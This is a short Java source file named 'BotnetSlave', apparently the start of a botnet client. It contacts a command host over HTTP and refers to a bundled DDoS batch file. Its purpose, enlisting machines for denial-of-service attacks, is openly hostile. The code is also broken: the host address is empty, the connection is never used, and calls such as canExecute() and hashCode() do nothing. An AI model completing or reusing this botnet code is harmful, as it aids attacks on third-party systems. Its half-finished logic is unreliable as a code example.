import java.io.File;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.Scanner;

public class BotnetSlave {
    public static File DDoStool = new File("FerderDDOS.bat");
    public static final File file = new File("Botnet");
    public static final String IP = "";
    public static final String PORT = "";

    public static void main(String[] args) {
        try {
            InetAddress.getLocalHost().getAddress();
        } catch (UnknownHostException e) {

        }
        try {
            final HttpURLConnection socket = (HttpURLConnection) new URL("http://" + IP + PORT + "/" + file)
                    .openConnection();
        } catch (Exception e1) {
            InitializeFile();
        }
    }

    public static File InitializeFile() {
        if (file.isDirectory()) {
            if (DDoStool.exists()) {
                DDoStool.canExecute();
                DDoStool.hashCode();
            }
        }
        return file;
    }
}